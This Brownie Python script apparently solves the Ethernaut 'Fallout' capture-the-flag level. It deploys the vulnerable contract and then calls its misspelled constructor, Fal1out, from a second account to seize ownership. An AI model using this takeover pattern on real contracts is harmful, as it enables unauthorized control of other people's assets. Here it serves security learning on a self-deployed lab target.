# Claim ownership of the contract below to complete this level.

from brownie import Fallout
from scripts.helpers import get_account, deploy_contract


def claim_ownership_of_fallout(account_to_deploy, account_to_claim):
    print("Deploying contract..")
    fallout_contract = deploy_contract(Fallout, account_to_deploy)
    tx_fallout = fallout_contract.Fal1out({"from": account_to_claim})
    tx_fallout.wait(1)
    return fallout_contract


def main():
    # set account
    account_to_deploy = get_account(0)
    account_to_claim = get_account(1)
    # claim ownership
    claim_ownership_of_fallout(account_to_deploy, account_to_claim)

